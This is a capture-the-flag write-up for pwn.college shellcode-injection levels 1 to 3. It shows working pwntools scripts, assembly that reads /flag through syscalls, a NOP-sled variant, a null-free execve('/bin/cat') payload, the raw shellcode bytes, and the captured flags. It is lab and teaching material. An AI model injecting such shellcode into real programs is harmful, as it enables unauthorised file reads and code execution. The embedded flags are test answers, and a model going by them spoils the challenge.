# LEVEL 1
Referred from what Yan from pwncollege taught in the intro.
Wrote the following python script with the assembly code of how I wanna use the `sendfile` command as per the chal desc.
```
from pwn import *

context.arch='amd64'
context.os='linux'

asmc='''
    mov rax, 0x00000067616c662f         ; /flag
    push rax                            

    mov rdi, rsp                                   
    mov rsi, 0                          
    mov rax, 2                          
    syscall

    mov rdi, rax                        
    mov rsi, rsp                        
    mov rdx, 1000                       
    mov rax, 0                          
    syscall

    mov rdi, 1                          
    mov rsi, rsp                        
    mov rdx, rax                        
    mov rax, 1                          
    syscall

    mov rdi, 40                        
    mov rax, 60                         
    syscall
'''

sc=asm(asmc)
print(sc)

```
`echo -en 'H\xb8/flag\x00\x00\x00PH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H\xc7\xc0\x02\x00\x00\x00\x0f\x05H\x89\xc7H\x89\xe6H\xc7\xc2\xe8\x03\x00\x00H\xc7\xc0\x00\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\x89\xc2H\xc7\xc0\x01\x00\x00\x00\x0f\x05H\xc7\xc7(\x00\x00\x00H\xc7\xc0<\x00\x00\x00\x0f\x05' ` was the shellcode to be given to the chall.
```
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffecc2d2370 | 48 b8 2f 66 6c 61 67 00 00 00                 | movabs rax, 0x67616c662f
0x00007ffecc2d237a | 50                                            | push rax
0x00007ffecc2d237b | 48 89 e7                                      | mov rdi, rsp
0x00007ffecc2d237e | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffecc2d2385 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffecc2d238c | 0f 05                                         | syscall
0x00007ffecc2d238e | 48 89 c7                                      | mov rdi, rax
0x00007ffecc2d2391 | 48 89 e6                                      | mov rsi, rsp
0x00007ffecc2d2394 | 48 c7 c2 e8 03 00 00                          | mov rdx, 0x3e8
0x00007ffecc2d239b | 48 c7 c0 00 00 00 00                          | mov rax, 0
0x00007ffecc2d23a2 | 0f 05                                         | syscall
0x00007ffecc2d23a4 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffecc2d23ab | 48 89 e6                                      | mov rsi, rsp
0x00007ffecc2d23ae | 48 89 c2                                      | mov rdx, rax
0x00007ffecc2d23b1 | 48 c7 c0 01 00 00 00                          | mov rax, 1
0x00007ffecc2d23b8 | 0f 05                                         | syscall
0x00007ffecc2d23ba | 48 c7 c7 28 00 00 00                          | mov rdi, 0x28
0x00007ffecc2d23c1 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffecc2d23c8 | 0f 05                                         | syscall

Executing shellcode!

pwn.college{YvajjOW2LxGo54Yw6pt32rm-9hH.01NxIDL3AjN1czW}

```

> FLAG -> pwn.college{YvajjOW2LxGo54Yw6pt32rm-9hH.01NxIDL3AjN1czW}

# LEVEL 2
The challenge is the same as before, just that the program skips 2048 lines, so we have to add nop sleds such that the necessary part of the shellcode gets executed.  
```
from pwn import *

context.arch='amd64'
context.os='linux'
asmc='''
    .rept 2048
        nop
    .endr
    mov rax, 0x00000067616c662f    ; /flag     
    push rax                            

    mov rdi, rsp                                   
    mov rsi, 0                          
    mov rax, 2                          
    syscall

    mov rdi, rax                        
    mov rsi, rsp                        
    mov rdx, 1000                       
    mov rax, 0                          
    syscall

    mov rdi, 1                          
    mov rsi, rsp                        
    mov rdx, rax                        
    mov rax, 1                          
    syscall

    mov rdi, 40                        
    mov rax, 60                         
    syscall
'''


sc=asm(asmc)
print(sc)
```

> FLAG -> pwn.college{U2m9XCBD29YjCItiC9cjHnlcsod.0FOxIDL3AjN1czW}

# LEVEL 3
According to the chal, our written shell code must have 0 NULL bytes. 
I used `Shellcraft` to make my script which gave me the shellcode to bring about this.  
I first gave the argument as `/bin/sh`, weirdly it gave me the flag in an unusual way.
```
Executing shellcode!

/flag: 1: pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}: not found
```
I later did some research and found out that I had to give in `/bin/cat` as an argument to read the flag!
I did so, and got a smooth response.

```
      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000026c95000 | 6a 01                                         | push 1
0x0000000026c95002 | fe 0c 24                                      | dec byte ptr [rsp]
0x0000000026c95005 | 48 b8 2f 62 69 6e 2f 63 61 74                 | movabs rax, 0x7461632f6e69622f
0x0000000026c9500f | 50                                            | push rax
0x0000000026c95010 | 48 89 e7                                      | mov rdi, rsp
0x0000000026c95013 | 48 b8 01 01 01 01 01 01 01 01                 | movabs rax, 0x101010101010101
0x0000000026c9501d | 50                                            | push rax
0x0000000026c9501e | 48 b8 01 2e 67 6d 60 66 01 01                 | movabs rax, 0x10166606d672e01
0x0000000026c95028 | 48 31 04 24                                   | xor qword ptr [rsp], rax
0x0000000026c9502c | 48 b8 2f 62 69 6e 2f 63 61 74                 | movabs rax, 0x7461632f6e69622f
0x0000000026c95036 | 50                                            | push rax
0x0000000026c95037 | 31 f6                                         | xor esi, esi
0x0000000026c95039 | 56                                            | push rsi
0x0000000026c9503a | 6a 11                                         | push 0x11
0x0000000026c9503c | 5e                                            | pop rsi
0x0000000026c9503d | 48 01 e6                                      | add rsi, rsp
0x0000000026c95040 | 56                                            | push rsi
0x0000000026c95041 | 6a 10                                         | push 0x10
0x0000000026c95043 | 5e                                            | pop rsi
0x0000000026c95044 | 48 01 e6                                      | add rsi, rsp
0x0000000026c95047 | 56                                            | push rsi
0x0000000026c95048 | 48 89 e6                                      | mov rsi, rsp
0x0000000026c9504b | 31 d2                                         | xor edx, edx
0x0000000026c9504d | 6a 3b                                         | push 0x3b
0x0000000026c9504f | 58                                            | pop rax
0x0000000026c95050 | 0f 05                                         | syscall
Executing shellcode!

pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}
```

> FLAG -> pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}
# LEVEL 4
